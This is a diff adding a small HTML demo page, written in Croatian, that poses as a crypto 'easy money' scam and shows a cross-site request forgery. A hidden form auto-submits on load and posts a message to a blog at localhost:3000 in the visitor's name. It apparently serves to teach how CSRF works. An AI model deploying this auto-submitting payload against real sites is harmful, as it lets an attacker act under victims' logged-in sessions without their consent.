@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="hr">
+
+<head>
+   <title>Laka zarada!</title>
+</head>
+
+<body>
+   <h1>Laka zarada!</h1>
+
+   <p>Mate Rimac vam nudi laku zaradu, kriptovalute, deepfake video neki... Zamislite da je ovo stock prevara stranica, koja je već poslala post request da nešto objavi na blogu u vaše ime</p>
+   
+   <form action="http://localhost:3000/blog" method="POST">
+      <input type="hidden" name="post_text" value="Ovo sam definitivno ja! Pozdrav svima, Mate Rimac me obogatio!" />
+   </form>
+
+   <script>
+      document.forms[0].submit();
+   </script>
+</body>
+
+</html>
